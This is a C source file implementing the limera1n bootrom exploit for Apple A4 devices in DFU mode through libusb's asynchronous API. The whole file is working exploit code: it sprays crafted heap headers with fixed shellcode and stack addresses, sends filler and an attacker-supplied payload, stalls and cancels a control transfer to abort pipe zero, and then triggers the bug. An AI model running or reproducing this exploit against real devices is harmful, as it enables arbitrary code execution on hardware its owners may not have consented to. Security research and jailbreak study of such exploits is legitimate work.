/*
 * limera1n for A4 (CPID 0x8930) using libusb's asynchronous API.
 *
 * The IOKit implementation of this exploit submits the stalling DFU transfer
 * asynchronously and then aborts pipe zero. libusb exposes the same primitive
 * (submit + cancel -> USBDEVFS_DISCARDURB), which the synchronous 10 ms
 * timeout used by the original Linux port cannot reproduce.
 *
 * Usage: limera1n_async <payload>
 */
#include <libusb-1.0/libusb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <unistd.h>

#define VID 0x05AC
#define PID 0x1227
#define CHUNK 0x800
#define MAX_SIZE 0x2C000u
#define STACK_ADDRESS 0x8403BF9Cu
#define SHELLCODE_ADDRESS 0x8402B001u

static libusb_device_handle *handle;
static int transfer_done;

static void on_complete(struct libusb_transfer *t)
{
    (void) t;
    transfer_done = 1;
}

static void ctrl(uint8_t request, unsigned char *data, uint16_t length, unsigned timeout)
{
    int rc = libusb_control_transfer(handle, 0x21, request, 0, 0, data, length, timeout);
    if (rc < 0)
        fprintf(stderr, "  request %u len %u failed: %s\n", request, length, libusb_error_name(rc));
}

int main(int argc, char **argv)
{
    if (argc != 2) {
        fprintf(stderr, "usage: %s <payload>\n", argv[0]);
        return 1;
    }

    unsigned char payload[CHUNK];
    memset(payload, 0, sizeof(payload));
    FILE *f = fopen(argv[1], "rb");
    if (!f) {
        perror("payload");
        return 1;
    }
    size_t got = fread(payload, 1, sizeof(payload), f);
    fclose(f);
    printf("payload: %zu bytes\n", got);

    libusb_context *ctx = NULL;
    if (libusb_init(&ctx) < 0) {
        fprintf(stderr, "libusb_init failed\n");
        return 1;
    }
    libusb_set_option(ctx, LIBUSB_OPTION_LOG_LEVEL, LIBUSB_LOG_LEVEL_WARNING);

    handle = libusb_open_device_with_vid_pid(ctx, VID, PID);
    if (!handle) {
        fprintf(stderr, "no 05ac:1227 DFU device\n");
        return 1;
    }
    libusb_set_configuration(handle, 1);
    if (libusb_claim_interface(handle, 0) < 0) {
        fprintf(stderr, "claim_interface failed\n");
        return 1;
    }

    unsigned char buf[CHUNK];

    printf("reset counters\n");
    fflush(stdout);
    ctrl(4, NULL, 0, 1000);

    printf("heap headers\n");
    fflush(stdout);
    memset(buf, 0xCC, sizeof(buf));
    for (unsigned i = 0; i < CHUNK; i += 0x40) {
        unsigned *hdr = (unsigned *) (buf + i);
        hdr[0] = 0x405;
        hdr[1] = 0x101;
        hdr[2] = SHELLCODE_ADDRESS;
        hdr[3] = STACK_ADDRESS;
    }
    ctrl(1, buf, CHUNK, 1000);

    printf("filler\n");
    fflush(stdout);
    memset(buf, 0xCC, sizeof(buf));
    for (unsigned sent = 0; sent < MAX_SIZE - (CHUNK * 3); sent += CHUNK)
        ctrl(1, buf, CHUNK, 1000);

    printf("shellcode\n");
    fflush(stdout);
    ctrl(1, payload, CHUNK, 1000);

    printf("submitting stalling transfer\n");
    fflush(stdout);
    unsigned char *abuf = malloc(LIBUSB_CONTROL_SETUP_SIZE + CHUNK);
    libusb_fill_control_setup(abuf, 0x21, 1, 0, 0, CHUNK);
    memset(abuf + LIBUSB_CONTROL_SETUP_SIZE, 0xBB, CHUNK);

    struct libusb_transfer *t = libusb_alloc_transfer(0);
    libusb_fill_control_transfer(t, handle, abuf, on_complete, NULL, 0);
    int rc = libusb_submit_transfer(t);
    if (rc < 0) {
        fprintf(stderr, "submit failed: %s\n", libusb_error_name(rc));
        return 1;
    }

    usleep(5000);

    printf("aborting pipe zero\n");
    fflush(stdout);
    libusb_cancel_transfer(t);

    struct timeval tv = {0, 300000};
    while (!transfer_done) {
        if (libusb_handle_events_timeout(ctx, &tv) < 0)
            break;
    }
    printf("  cancelled, status %d\n", t->status);

    printf("trigger\n");
    fflush(stdout);
    ctrl(2, NULL, 0, 1000);

    printf("exploit sent\n");
    fflush(stdout);

    libusb_free_transfer(t);
    free(abuf);
    libusb_close(handle);
    libusb_exit(ctx);
    return 0;
}
